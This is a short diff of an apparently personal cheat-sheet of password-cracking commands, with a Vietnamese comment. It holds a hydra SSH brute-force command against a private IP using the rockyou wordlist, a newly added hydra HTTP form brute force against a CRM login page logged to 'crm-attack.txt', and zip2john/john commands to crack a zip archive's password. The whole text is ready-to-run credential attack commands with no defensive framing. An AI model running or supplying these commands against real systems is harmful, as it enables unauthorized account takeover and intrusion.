@@ -1,5 +1,5 @@
 hydra -t 5 -V -f -l anne -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  192.168.0.105 ssh ( brute force password ssh neu da biet username) 
-
+hydra 192.168.101.10 -s 88 http-form-post "/index.php?module=User&action=Login:__vtrasdsa=sid%279423983289329847sdnkj3849234&username=^USER^&password=^PASS^:Error=1" -l admin -P /usr/share/wordlist/123.txt -t 20 -o crm-attack.txt
 zip2john respectmydrip.zip > hash.txt  
 john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
 
